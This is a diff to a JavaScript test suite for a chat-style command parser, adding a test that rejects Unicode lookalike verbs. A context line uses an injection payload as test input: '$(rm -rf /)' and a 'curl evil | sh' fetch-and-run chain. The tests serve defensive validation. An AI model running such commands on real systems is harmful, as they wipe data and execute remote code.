@@ -59,6 +59,11 @@ describe("parseCommand", () => {
     expect(err(`${G} report ${"x".repeat(4001)}`)).toMatch(/invalid report/);
   });
 
+  it("accepts only ASCII verbs (no Unicode case-folding tricks)", () => {
+    expect(err(`${G} RETAS\u212A LB-001 note`)).toMatch(/unknown command/);
+    expect(err(`${G} m\u0435rge LB-001`)).toMatch(/unknown command/);
+  });
+
   it("treats shell metacharacters as plain text", () => {
     const c = ok(`${G} report $(rm -rf /); \`curl evil\` | sh && echo pwned`);
     expect(c).toMatchObject({ kind: "report" });
